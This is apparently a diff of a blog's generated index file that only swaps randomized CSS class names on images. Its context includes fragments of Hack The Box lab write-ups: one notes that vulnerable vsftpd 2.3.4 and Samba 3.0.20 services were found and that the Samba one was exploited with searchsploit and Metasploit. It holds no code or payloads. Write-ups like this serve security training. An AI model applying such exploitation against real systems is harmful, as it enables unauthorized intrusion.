+    <content><![CDATA[<style>.hngrjtcyfcrb{zoom:50%;}</style><img src="/Hackthebox/htb/htb-lame/fb2d9f98400e3c802a0d7145e125c4ff.png" class="hngrjtcyfcrb">
 
 <span id="more"></span>
 
@@ -3619,11 +4108,11 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td>Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.ghfybsadwqnk{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201155450222.png" class="ghfybsadwqnk" alt="Nmap">
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.yycktcykjwki{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201155450222.png" class="yycktcykjwki" alt="Nmap">
 
 <p>发现两个可疑服务21(vsftpd 2.3.4)和445(Samba 3.0.20)，使用searchsploit 检索可用exp<img src="/Hackthebox/htb/htb-lame/image-20250201160141376.png" class="" title="searchploit"></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用vsftpd的漏洞，失败，换smb漏洞, 成功</p>
-<style>.kpeypgoovlcp{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201174838005.png" class="kpeypgoovlcp" alt="msfconsole">
+<style>.osrsgttfgwys{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201174838005.png" class="osrsgttfgwys" alt="msfconsole">
 
 <img src="/Hackthebox/htb/htb-lame/image-20250201175040335.png" class="" title="searchsploit">
 
@@ -3656,7 +4145,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Optimum</title>
     <url>/Hackthebox/htb/htb-optimum/</url>
-    <content><![CDATA[<style>.bookwpxxqckt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-optimum/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="bookwpxxqckt">
+    <content><![CDATA[<style>.mbotdiqcnjxn{zoom:50%;}</style><img src="/Hackthebox/htb/htb-optimum/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="mbotdiqcnjxn">
 
 <span id="more"></span>
 
@@ -3718,7 +4207,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Beep</title>
     <url>/Hackthebox/htb/htb-beep/</url>
-    <content><![CDATA[<style>.khckwrnceenu{zoom:50%;}</style><img src="/Hackthebox/htb/htb-beep/995f465295b99869fce21ecadea4604c.png" class="khckwrnceenu">
+    <content><![CDATA[<style>.gbvtnriliftg{zoom:50%;}</style><img src="/Hackthebox/htb/htb-beep/995f465295b99869fce21ecadea4604c.png" class="gbvtnriliftg">
 
 <span id="more"></span>
 
